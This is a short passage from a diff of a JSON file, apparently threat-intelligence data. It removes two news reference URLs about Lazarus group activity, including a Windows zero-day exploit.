-        "https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html",
-        "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/"
       ]
     }
   ],
